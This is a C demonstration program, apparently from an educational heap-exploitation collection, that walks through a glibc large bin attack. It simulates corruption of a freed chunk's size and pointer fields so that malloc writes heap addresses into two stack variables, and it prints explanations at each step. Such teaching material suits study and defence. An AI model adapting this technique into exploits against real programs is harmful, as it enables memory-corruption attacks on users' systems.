/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */

#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
 
int main()
{
    setbuf(stdout, NULL);

    printf("This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    printf("In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    printf("Let's first look at the targets we want to rewrite on stack:\n");
    printf("stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    printf("stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x420);
    printf("Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);

    printf("And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x500);
    printf("Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    printf("And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x500);
    printf("Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
 
    printf("And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");
    malloc(0x20);
 
    free(p1);
    free(p2);
    printf("We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

    malloc(0x90);
    printf("Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
    printf("Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
 
    //------------VULNERABILITY-----------

    printf("Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    printf("Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    //------------------------------------

    malloc(0x90);
 
    printf("Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    printf("stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    printf("stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    // sanity check
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;
}
